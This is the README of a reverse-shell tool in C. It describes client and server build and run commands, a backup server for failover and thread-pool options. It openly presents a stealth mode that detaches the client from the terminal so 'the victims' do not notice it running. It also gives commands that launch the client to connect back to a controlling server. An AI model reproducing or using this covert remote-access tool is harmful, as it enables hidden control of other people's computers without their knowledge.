# Reverse Shell
this projects contains a client side and a server side
## client side:
```
make && ./client -i ip -p port --detach 
```
if you use --detach it makes a child process and kills the parent and  detachs the child from terminal so the victims does not realize that the program is still running 
and reroute stdout to a file for debug purposes
client gets a back up port and ip and makes a child process so if we confronted any problems with connecting to the current server the it signals the already made child process to proceed and connect
to the back up server with the given back up port and ip given from the server during  the handshake

## server side (ordinary)
```
make && ./server -p port -b backlog -s part_size -bp backup_port -bi backup_ip 
```
it sends the part size to the client and each socket will sends maximum of part size data 
you can change that for better performance

## server side (multi client) 
```
make && ./server -p port -b backlog -s part_size -bp backup_port -bi backup_ip  -t thread_num
it uses thread pool for dealing with clinets and a seperate thread for accepting them
thread_num indicates that how any threads we want to have in out thread pool
it is important that it should be at least 5 threads and an optimal of 10 threads
```

## how to run 
run ```make``` for both to compile them 
### server side
```
./out/server.out -b 4 -s 400 -bp 3001 -bi 127.0.0.1  -p 3000

```
add  ```-t 10 ``` for threaded server and change ./out/server.out to ./out/parserver.out
### client side
```
./out/client.out -i 127.0.0.1  -p 3004 --detached
```
